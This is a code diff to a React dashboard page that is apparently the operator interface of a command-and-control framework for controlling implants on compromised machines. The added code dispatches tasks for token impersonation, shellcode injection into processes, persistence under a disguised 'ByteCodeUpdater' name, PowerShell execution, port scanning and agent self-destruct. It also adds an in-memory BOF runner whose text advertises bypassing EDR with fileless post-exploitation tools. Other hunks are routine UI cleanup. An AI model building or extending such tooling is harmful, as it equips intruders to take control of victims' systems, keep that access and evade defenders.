@@ -51,10 +51,6 @@ const AgentDetailPage = () => {
   const [pendingTasks, setPendingTasks] = useState([]);
   const [autoScroll, setAutoScroll] = useState(true);
   const [sidebarCollapsed, setSidebarCollapsed] = useState(false);
-  const [lastClearedResultId, setLastClearedResultId] = useState(() => {
-
-    return localStorage.getItem(`clear_id_${id}`);
-  });
   const [isMonitoring, setIsMonitoring] = useState(false);
   const seenPsPids = useRef(new Set());
   const seenNetKeys = useRef(new Set());
@@ -235,16 +231,143 @@ const AgentDetailPage = () => {
     e.preventDefault();
     if (!command.trim() || executing) return;
 
+    const parts = command.trim().split(/\s+/);
+    const cmd = parts[0].toLowerCase();
+    const args = parts.slice(1);
+
+    let taskType = 'execute_command';
+    let payload = { command };
+
+    // Tactical Command Mapping
+    switch (cmd) {
+      case 'getprivs':
+        taskType = 'getprivs';
+        payload = {};
+        break;
+      case 'impersonate':
+        if (args.length < 1) {
+          addToast('Usage: impersonate <pid>', 'error');
+          return;
+        }
+        taskType = 'impersonate';
+        payload = { pid: parseInt(args[0]) };
+        break;
+      case 'revert_self':
+        taskType = 'revert_self';
+        payload = {};
+        break;
+      case 'ps':
+        taskType = 'ps_json';
+        payload = {};
+        break;
+      case 'ls':
+        taskType = 'ls_json';
+        payload = { path: args[0] || '.' };
+        break;
+      case 'screenshot':
+        taskType = 'screenshot';
+        payload = {};
+        break;
+      case 'self_destruct':
+        if (!confirm('Are you sure? This will remove the agent from the target.')) return;
+        taskType = 'self_destruct';
+        payload = {};
+        break;
+      case 'netstat':
+        taskType = 'netstat_json';
+        payload = {};
+        break;
+      case 'portscan':
+        if (args.length < 1) {
+          addToast('Usage: portscan <target> [ports]', 'error');
+          return;
+        }
+        taskType = 'portscan';
+        payload = { target: args[0], ports: args[1] || '1-1024' };
+        break;
+      case 'persist':
+        taskType = 'persist';
+        payload = { name: args[0] || 'ByteCodeUpdater', path: args[1] || 'C:\\Windows\\Temp\\bytecode.exe' };
+        break;
+      case 'unpersist':
+        taskType = 'unpersist';
+        payload = { name: args[0] || 'ByteCodeUpdater' };
+        break;
+      case 'getenv':
+        taskType = 'getenv';
+        payload = {};
+        break;
+      case 'powershell':
+        if (args.length < 1) {
+          addToast('Usage: powershell <script_block>', 'error');
+          return;
+        }
+        taskType = 'powershell';
+        payload = { command: args.join(' ') };
+        break;
+      case 'inject':
+        if (args.length < 2) {
+          addToast('Usage: inject <pid> <base64_shellcode>', 'error');
+          return;
+        }
+        taskType = 'inject';
+        payload = { pid: parseInt(args[0]), shellcode: args[1] };
+        break;
+      case 'mkdir':
+        if (args.length < 1) {
+          addToast('Usage: mkdir <path>', 'error');
+          return;
+        }
+        taskType = 'mkdir';
+        payload = { path: args[0] };
+        break;
+      case 'rm':
+        if (args.length < 1) {
+          addToast('Usage: rm <path>', 'error');
+          return;
+        }
+        taskType = 'rm';
+        payload = { path: args[0] };
+        break;
+      case 'cp':
+        if (args.length < 2) {
+          addToast('Usage: cp <src> <dest>', 'error');
+          return;
+        }
+        taskType = 'cp';
+        payload = { src: args[0], dest: args[1] };
+        break;
+      case 'mv':
+        if (args.length < 2) {
+          addToast('Usage: mv <src> <dest>', 'error');
+          return;
+        }
+        taskType = 'mv';
+        payload = { src: args[0], dest: args[1] };
+        break;
+      case 'cat':
+        if (args.length < 1) {
+          addToast('Usage: cat <path>', 'error');
+          return;
+        }
+        taskType = 'cat';
+        payload = { path: args[0] };
+        break;
+      case 'help':
+        addToast('Commands: getprivs, impersonate, revert_self, ps, ls, screenshot, netstat, portscan, persist, unpersist, getenv, powershell, inject, mkdir, rm, cp, mv, cat, self_destruct', 'info');
+        setCommand('');
+        return;
+    }
+
     setExecuting(true);
     try {
-      const result = await tasksApi.create(id, 'execute_command', { command });
+      const result = await tasksApi.create(id, taskType, payload);
       
-      // Add to pending for immediate console feedback
       const taskObj = result.task || result;
       setPendingTasks(prev => [...prev, {
         id: taskObj.id,
-        task_type: 'execute_command',
-        task_payload: JSON.stringify({ command }),
+        task_type: taskType,
+        task_payload: JSON.stringify(payload),
         status: 'pending',
         created_at: new Date().toISOString()
       }]);
@@ -252,13 +375,12 @@ const AgentDetailPage = () => {
       setCommandHistory(prev => [command, ...prev].slice(0, 50));
       setHistoryIndex(-1);
       setCommand('');
-      addToast(`Command dispatched: ${command.split(' ')[0]}`, 'success');
+      addToast(`Task dispatched: ${taskType}`, 'success');
       
-      // Immediate refresh
       fetchDetails();
     } catch (err) {
       console.error(err);
-      addToast('Failed to dispatch command', 'error');
+      addToast('Failed to dispatch task', 'error');
     } finally {
       setExecuting(false);
     }
@@ -632,12 +754,6 @@ const AgentDetailPage = () => {
         </div>
         </div>
 
-        <div className="flex items-center gap-12">
-          <div className="hidden xl:flex flex-col items-end">
-            <span className="text-[10px] font-bold text-slate-500 uppercase tracking-wider mb-1">Last Contact</span>
-            <span className="text-[11px] font-medium text-slate-300">{agent.last_seen ? formatDistanceToNow(new Date(agent.last_seen), { addSuffix: true }) : 'Never'}</span>
-          </div>
-        </div>
 
         <div className="flex items-center gap-8">
           <div className="flex flex-col items-end">
@@ -699,21 +815,23 @@ const AgentDetailPage = () => {
               <div className="space-y-4 pt-4 border-t border-slate-800/50">
                 <span className="text-[11px] font-bold text-slate-500 uppercase tracking-wider">Command Shortcuts</span>
                 <div className="grid grid-cols-2 gap-2">
-                  {[
-                    { label: 'Screenshot', icon: Monitor, type: 'screenshot' },
-                    { label: 'Shell Info', icon: TerminalIcon, type: 'system_info' },
-                    { label: 'Net Check', icon: Wifi, type: 'netstat_json' },
-                    { label: 'Process Sc', icon: Cpu, type: 'ps_json' },
-                  ].map((action, i) => (
-                    <button
-                      key={i}
-                      onClick={() => handleQuickAction(action.type, {})}
-                      className="flex flex-col items-center justify-center gap-3 p-4 rounded-xl bg-slate-900/40 border border-slate-800/50 hover:border-primary/40 hover:bg-primary/5 transition-all group"
-                    >
-                      <action.icon className="w-5 h-5 text-slate-500 group-hover:text-primary transition-colors" />
-                      <span className="text-[10px] font-bold text-slate-500 group-hover:text-slate-300 uppercase tracking-wider">{action.label}</span>
-                    </button>
-                  ))}
+                    {[
+                      { label: 'Screenshot', icon: Monitor, type: 'screenshot' },
+                      { label: 'Shell Info', icon: TerminalIcon, type: 'system_info' },
+                      { label: 'Net Check', icon: Wifi, type: 'netstat_json' },
+                      { label: 'Process Sc', icon: Cpu, type: 'ps_json' },
+                      { label: 'Get Privs', icon: ShieldCheck, type: 'getprivs' },
+                      { label: 'Identity', icon: MousePointer2, type: 'revert_self' },
+                    ].map((action, i) => (
+                      <button
+                        key={i}
+                        onClick={() => handleQuickAction(action.type, {})}
+                        className="flex flex-col items-center justify-center gap-3 p-4 rounded-xl bg-slate-900/40 border border-slate-800/50 hover:border-primary/40 hover:bg-primary/5 transition-all group"
+                      >
+                        <action.icon className="w-5 h-5 text-slate-500 group-hover:text-primary transition-colors" />
+                        <span className="text-[10px] font-bold text-slate-500 group-hover:text-slate-300 uppercase tracking-wider">{action.label}</span>
+                      </button>
+                    ))}
                 </div>
               </div>
 
@@ -800,32 +918,31 @@ const AgentDetailPage = () => {
                                   }
                                   metadata.tags = (metadata.tags || []).filter(t => t !== tag);
                                   await agentsApi.updateMetadata(id, metadata);
+                                  addToast('Tag removed', 'info');
                                   fetchDetails();
                                 }}
-                                className="hover:text-white"
+                                className="hover:text-white transition-colors"
                               >
                                 ×
                               </button>
                             </span>
                           ))}
                           <button 
-                            onClick={() => {
+                            onClick={async () => {
                               const tag = prompt('Enter new tag:');
-                              if (tag) {
-                                (async () => {
-                                  let metadata = {};
-                                  try { 
-                                    metadata = JSON.parse(agent.metadata || '{}'); 
-                                  } catch {
-                                    /* ignore parsing error */
-                                  }
-                                  metadata.tags = [...(metadata.tags || []), tag];
-                                  await agentsApi.updateMetadata(id, metadata);
-                                  fetchDetails();
-                                })();
+                              if (!tag) return;
+                              let metadata = {};
+                              try { 
+                                metadata = JSON.parse(agent.metadata || '{}'); 
+                              } catch {
+                                /* ignore parsing error */
                               }
+                              metadata.tags = [...(metadata.tags || []), tag];
+                              await agentsApi.updateMetadata(id, metadata);
+                              addToast('Tag added', 'success');
+                              fetchDetails();
                             }}
-                            className="px-2 py-0.5 rounded-lg border border-slate-800 border-dashed text-[9px] font-black text-slate-600 uppercase tracking-widest hover:border-slate-600 hover:text-slate-400 transition-all"
+                            className="px-2 py-0.5 rounded-lg border border-slate-800 text-[9px] font-bold text-slate-500 uppercase tracking-widest hover:border-slate-600 hover:text-slate-300 transition-all"
                           >
                             + Add Tag
                           </button>
@@ -833,122 +950,64 @@ const AgentDetailPage = () => {
                       );
                     })()}
                   </div>
-
                 </div>
-              </div>
-
-              {/* Health Monitor */}
-              <div className="p-4 rounded-2xl bg-emerald-500/5 border border-emerald-500/10">
-                <div className="flex items-center justify-between mb-3">
-                  <span className="text-[10px] font-black text-emerald-500/70 uppercase tracking-widest">Connectivity</span>
-                  <Wifi className="w-3.5 h-3.5 text-emerald-500/50" />
-                </div>
-                <div className="h-1.5 w-full bg-emerald-500/10 rounded-full overflow-hidden">
-                  <div className="h-full bg-emerald-500 w-full animate-pulse shadow-[0_0_8px_rgba(16,185,129,0.5)]" />
-                </div>
-                <p className="text-[9px] text-emerald-500/60 font-bold mt-2 uppercase tracking-tighter">Stable Beacon • {agent.beacon_interval}s Interval</p>
               </div>
             </div>
           </div>
         )}
 
-        {/* Right Module: Interaction Workspace */}
-
-
-        <div className="flex-1 flex flex-col min-w-0 bg-slate-950/20">
-          {/* Module Navigation */}
-          <div className="h-12 border-b border-border bg-surface/50 flex items-center px-8 gap-8 shrink-0">
-            {[
-              { id: 'console', label: 'Console', icon: TerminalIcon },
-              { id: 'processes', label: 'Processes', icon: Cpu },
-              { id: 'files', label: 'File Explorer', icon: Folder },
-              { id: 'network', label: 'Network', icon: Globe },
-            ].map(tab => (
-              <button
-                key={tab.id}
-                onClick={() => setActiveTab(tab.id)}
-                className={`flex items-center gap-2.5 h-full border-b-2 transition-all relative ${
-                  activeTab === tab.id 
-                    ? 'border-primary text-white' 
-                    : 'border-transparent text-slate-500 hover:text-slate-300'
-                }`}
-              >
-                <tab.icon className={`w-4 h-4 ${activeTab === tab.id ? 'text-primary' : 'text-slate-500'}`} />
-                <span className="text-[11px] font-bold uppercase tracking-wider">{tab.label}</span>
-              </button>
-            ))}
-          </div>
-
-
-          {/* Module Content */}
-          <div className="flex-1 overflow-hidden relative flex flex-col">
-            {activeTab === 'console' && (
-              <div className="card flex-1 flex flex-col overflow-hidden relative border-slate-800/50 bg-surface/40">
-              <div className="px-5 py-2.5 border-b border-border flex items-center justify-between bg-surface/50 shrink-0">
-                <div className="flex items-center gap-2.5">
-                  <TerminalIcon className="w-3.5 h-3.5 text-primary" />
-                  <span className="text-[10px] font-bold text-white uppercase tracking-widest">Live Shell Session</span>
-                </div>
-                <div className="flex items-center gap-5">
-                  <div className="flex items-center gap-2">
-                    <span className="w-1 h-1 rounded-full bg-success shadow-[0_0_8px_var(--color-success)]" />
-                    <span className="text-[9px] font-bold text-slate-500 uppercase">{agent.beacon_interval}s Interval</span>
-                  </div>
-                  <div className="h-3 w-px bg-border" />
-                  <button 
-                    onClick={() => {
-                      if(confirm('Clear console output?')) {
-                        const lastId = results.length > 0 ? results[results.length - 1].id : null;
-                        setLastClearedResultId(lastId);
-                        if (lastId) {
-                          localStorage.setItem(`clear_id_${id}`, lastId);
-                        }
-                        addToast('Console cleared', 'info');
-                      }
-                    }}
-                    className="flex items-center gap-1.5 text-slate-500 hover:text-white transition-colors"
+        {/* Center Panel: Content & Console */}
+        <div className="flex-1 flex flex-col min-w-0 bg-black/20">
+          <div className="flex-1 flex flex-col overflow-hidden">
+              {/* Tabs Navigation */}
+              <div className="shrink-0 flex border-b border-slate-800/50 px-4 bg-slate-900/20">
+                {[
+                  { id: 'console', label: 'Terminal', icon: TerminalIcon },
+                  { id: 'processes', label: 'Processes', icon: Cpu },
+                  { id: 'network', label: 'Network', icon: Globe },
+                  { id: 'files', label: 'Files', icon: Folder },
+                  { id: 'bof', label: 'BOF Runner', icon: Zap },
+                ].map((tab) => (
+                  <button
+                    key={tab.id}
+                    onClick={() => setActiveTab(tab.id)}
+                    className={`flex items-center gap-2 px-6 py-4 text-[10px] font-black uppercase tracking-widest transition-all relative ${
+                      activeTab === tab.id ? 'text-primary' : 'text-slate-500 hover:text-slate-300'
+                    }`}
                   >
-                    <Trash2 className="w-3 h-3" />
-                    <span className="text-[9px] font-bold uppercase tracking-wider">Clear</span>
+                    <tab.icon className="w-3.5 h-3.5" />
+                    {tab.label}
+                    {activeTab === tab.id && (
+                      <div className="absolute bottom-0 left-0 right-0 h-0.5 bg-primary shadow-[0_0_8px_var(--color-primary)]" />
+                    )}
                   </button>
-                </div>
+                ))}
               </div>
 
-              
-              <div className="flex-1 overflow-y-auto p-4 space-y-3 font-mono scrollbar-thin bg-black/40">
+          {activeTab === 'console' && (
+            <div className="flex-1 flex flex-col overflow-hidden relative">
+              <div className="flex-1 overflow-y-auto p-8 font-mono scrollbar-thin flex flex-col gap-8">
                 {(() => {
-                  const clearIndex = lastClearedResultId ? results.findIndex(r => r.id === lastClearedResultId) : -1;
-                  let visibleResults = results;
-                  if (lastClearedResultId) {
-                    visibleResults = clearIndex !== -1 ? results.slice(clearIndex + 1) : [];
-                  }
+                  const sortedResults = [...results].sort((a, b) => new Date(a.created_at) - new Date(b.created_at));
+                  const allItems = [...sortedResults, ...pendingTasks].sort((a, b) => new Date(a.created_at) - new Date(b.created_at));
                   
-                  const visibleEntries = [...visibleResults, ...pendingTasks]
-                    .sort((a, b) => new Date(a.created_at) - new Date(b.created_at));
-                  
-                  if (visibleEntries.length === 0) {
-                    return (
-                      <div className="h-full flex flex-col items-center justify-center opacity-20 pointer-events-none select-none">
-                        <TerminalIcon className="w-10 h-10 mb-4 text-slate-700" />
-                        <span className="text-[10px] font-bold uppercase tracking-[0.4em] text-slate-600">Awaiting Shell Input</span>
-                      </div>
-                    );
-                  }
-
-                  return visibleEntries.map((res) => {
-                    let payload = {};
-                    try {
-                      payload = typeof res.task_payload === 'string' ? JSON.parse(res.task_payload) : (res.task_payload || {});
-                    } catch (e) {
-                      console.warn("Failed to parse task payload", e);
-                    }
-                    const isPending = res.status === 'pending';
+                  return allItems.map((res) => {
+                    const isPending = !res.status || res.status === 'pending';
+                    const payload = typeof res.task_payload === 'string' ? JSON.parse(res.task_payload) : (res.task_payload || {});
                     
                     return (
-                      <div key={res.id} className={`group animate-in fade-in duration-300 ${isPending ? 'opacity-40' : ''}`}>
-                        <div className="flex items-center gap-3 text-slate-600 mb-1">
-                          <span className="text-[10px] font-mono opacity-50">[{format(new Date(res.created_at), 'HH:mm:ss')}]</span>
-                          <span className="text-[10px] font-bold uppercase tracking-widest">{res.task_type.replace('_json', '')}</span>
+                      <div key={res.id} className="group animate-in fade-in slide-in-from-left-4 duration-500">
+                        <div className="flex items-center gap-3 mb-3">
+                          <span className="text-[10px] font-bold text-slate-600 uppercase tracking-[0.2em]">
+                            [{format(new Date(res.created_at), 'HH:mm:ss')}]
+                          </span>
+                          <span className={`text-[10px] font-black uppercase tracking-widest px-2 py-0.5 rounded ${
+                            isPending ? 'bg-primary/10 text-primary animate-pulse' :
+                            res.status === 'success' ? 'bg-success/10 text-success' :
+                            'bg-error/10 text-error'
+                          }`}>
+                            {res.task_type.replace('_json', '')}
+                          </span>
                           {isPending ? (
                             <Loader2 className="w-3 h-3 animate-spin text-primary" />
                           ) : res.status === 'success' ? (
@@ -1050,21 +1109,6 @@ const AgentDetailPage = () => {
                     />
                     <RefreshCw className={`absolute left-3 top-2 w-3.5 h-3.5 text-slate-600 ${pendingTasks.some(t => t.task_type === 'ps_json') ? 'animate-spin' : ''}`} />
                   </div>
-                  
-                  <label className="flex items-center gap-2 cursor-pointer group whitespace-nowrap">
-                    <input 
-                      type="checkbox" 
-                      className="hidden"
-                      onChange={() => {
-                        // This state doesn't exist yet, I'll use psSearchQuery as a hack or just define it
-                        // Actually I'll just use a local filter logic
-                      }}
-                    />
-                    <div className="text-[10px] text-slate-500 font-bold uppercase tracking-widest flex items-center gap-2">
-                      <div className="w-2 h-2 rounded-full bg-red-500" />
-                      Risk Highlighting Active
-                    </div>
-                  </label>
                 </div>
 
                 <button 
@@ -1133,6 +1177,15 @@ const AgentDetailPage = () => {
                                 >
                                   <Trash2 className="w-3.5 h-3.5" />
                                 </button>
+                                <button 
+                                  onClick={() => {
+                                    handleQuickAction('impersonate', { pid: proc.pid });
+                                  }}
+                                  className="p-1.5 rounded-lg hover:bg-primary/10 text-slate-600 hover:text-primary transition-all opacity-0 group-hover:opacity-100"
+                                  title="Impersonate"
+                                >
+                                  <MousePointer2 className="w-3.5 h-3.5" />
+                                </button>
                               </td>
                             </tr>
                           );
@@ -1185,13 +1238,6 @@ const AgentDetailPage = () => {
                   >
                     <RefreshCw className={`w-3 h-3 ${pendingTasks.some(t => t.task_type === 'ls') ? 'animate-spin' : ''}`} />
                     Refresh
-                  </button>
-                  <button 
-                    onClick={() => {/* TODO: Implement Upload Modal */}}
-                    className="px-2.5 py-1.5 rounded-lg bg-primary text-white text-[9px] font-bold uppercase tracking-wider hover:bg-primary-hover transition-all flex items-center gap-2"
-                  >
-                    <ArrowDown className="w-3 h-3" />
-                    Upload
                   </button>
                 </div>
               </div>
@@ -1378,8 +1424,6 @@ const AgentDetailPage = () => {
                     <span className="text-[9px] font-black uppercase tracking-[0.15em]">{isOnline ? 'TACTICAL MONITOR' : 'MONITOR IDLE'}</span>
                   </button>
 
-
-                  
                   <div className="flex-1 max-w-sm relative flex items-center gap-2">
                     <div className="relative flex-1">
                       <input 
@@ -1398,9 +1442,8 @@ const AgentDetailPage = () => {
                       <RefreshCw className={`w-3.5 h-3.5 ${pendingTasks.some(t => t.task_type === 'netstat_json') ? 'animate-spin' : ''}`} />
                     </button>
                   </div>
-
-            </div>
-          </div>
+                </div>
+              </div>
               
               <div className="flex-1 overflow-y-auto scrollbar-thin">
                 <table className="w-full text-left text-[11px] border-collapse">
@@ -1408,24 +1451,14 @@ const AgentDetailPage = () => {
                     <tr>
                       <th className="px-5 py-3 border-b border-slate-800 font-bold uppercase tracking-wider w-20 text-[10px] text-slate-500">Proto</th>
                       <th className="px-5 py-3 border-b border-slate-800 font-bold uppercase tracking-wider text-[10px] text-slate-500">
-                        <div className="flex items-center gap-2">
-                          Local Address
-                          <span className="text-primary/50 text-[9px] font-bold lowercase tracking-normal">Port: 445</span>
-                          <button className="flex items-center gap-1 px-1.5 py-0.5 rounded bg-slate-800 text-[8px] border border-slate-700 hover:bg-slate-700 transition-colors">
-                            PORT RANGE <ChevronDown className="w-2.5 h-2.5" />
-                          </button>
-                        </div>
+                        Local Address
                       </th>
                       <th className="px-5 py-3 border-b border-slate-800 font-bold uppercase tracking-wider text-[10px] text-slate-500">
-                        <div className="flex items-center gap-1">
-                          Remote Address
-                          <span className="text-slate-700 text-[9px] font-bold tracking-normal uppercase">Port: 0</span>
-                        </div>
+                        Remote Address
                       </th>
                       <th className="px-5 py-3 border-b border-slate-800 font-bold uppercase tracking-wider text-[10px] text-slate-500">Status</th>
                       <th className="px-5 py-3 border-b border-slate-800 font-bold uppercase tracking-wider text-[10px] text-slate-500">PID/Process</th>
                     </tr>
-
                   </thead>
                   <tbody className="divide-y divide-slate-800/50">
                     {getLatestNetstatResult() ? (
@@ -1440,8 +1473,6 @@ const AgentDetailPage = () => {
                           const isNew = highlightedNetKeys.has(connKey);
                           
                           return (
-
-
                             <tr key={idx} className={`hover:bg-white/5 transition-colors group ${isNew ? 'bg-emerald-500/5 border-l-2 border-emerald-500' : ''}`}>
                             <td className="px-5 py-4">
                               <span className="px-2 py-0.5 rounded-md bg-sky-500/10 text-sky-400 text-[10px] font-black tracking-widest border border-sky-500/20">
@@ -1482,7 +1513,6 @@ const AgentDetailPage = () => {
                           </tr>
                         );
                       })
-
                     ) : (
                       <tr>
                         <td colSpan="4" className="py-20 text-center">
@@ -1495,6 +1525,63 @@ const AgentDetailPage = () => {
                 </table>
               </div>
             </div>
+          )}
+
+          {activeTab === 'bof' && (
+             <div className="card flex-1 flex flex-col overflow-hidden relative border-slate-800/50 p-12 items-center justify-center">
+                <div className="max-w-md w-full space-y-8 text-center animate-in fade-in zoom-in-95 duration-500">
+                  <div className="p-6 bg-primary/10 rounded-full w-24 h-24 mx-auto flex items-center justify-center border border-primary/20 shadow-[0_0_30px_rgba(var(--color-primary-rgb),0.2)]">
+                    <Zap className="w-10 h-10 text-primary" />
+                  </div>
+                  <div>
+                    <h2 className="text-2xl font-black text-white uppercase tracking-widest mb-2">In-Memory BOF Runner</h2>
+                    <p className="text-slate-500 text-sm">Execute unmanaged C object files directly in the agent's heap. Bypass EDR by running fileless post-exploitation tools.</p>
+                  </div>
+                  
+                  <div className="space-y-4">
+                    <div className="flex flex-col gap-2">
+                      <label className="text-[10px] font-black text-slate-500 uppercase tracking-widest text-left pl-1">Target Entry Point</label>
+                      <input 
+                        type="text" 
+                        placeholder="go (default)"
+                        className="w-full bg-black/40 border border-slate-800 rounded-xl px-4 py-3 text-white text-sm outline-none focus:border-primary/50 transition-all font-mono"
+                        id="bof-entry"
+                      />
+                    </div>
+                    
+                    <button 
+                      onClick={() => {
+                        const input = document.createElement('input');
+                        input.type = 'file';
+                        input.accept = '.o';
+                        input.onchange = async (e) => {
+                          const file = e.target.files[0];
+                          if (!file) return;
+                          const reader = new FileReader();
+                          reader.onload = async () => {
+                            const base64Data = reader.result.split(',')[1];
+                            const entryInput = document.getElementById('bof-entry');
+                            const entry = (entryInput && entryInput.value) || 'go';
+                            handleQuickAction('bof_run', { bof_data: base64Data, entry });
+                            setActiveTab('console');
+                          };
+                          reader.readAsDataURL(file);
+                        };
+                        input.click();
+                      }}
+                      className="w-full py-4 bg-primary text-white rounded-xl font-black uppercase tracking-[0.2em] text-xs hover:bg-primary-hover shadow-xl shadow-primary/20 transition-all flex items-center justify-center gap-3 active:scale-[0.98]"
+                    >
+                      <Download className="w-4 h-4" /> Load & Execute BOF
+                    </button>
+                  </div>
+                  
+                  <div className="pt-8 border-t border-slate-800/50">
+                    <div className="flex items-center gap-2 justify-center text-[9px] font-bold text-slate-600 uppercase tracking-widest">
+                      <ShieldCheck className="w-3 h-3" /> Reflective COFF Loading Active
+                    </div>
+                  </div>
+                </div>
+             </div>
           )}
           </div>
         </div>
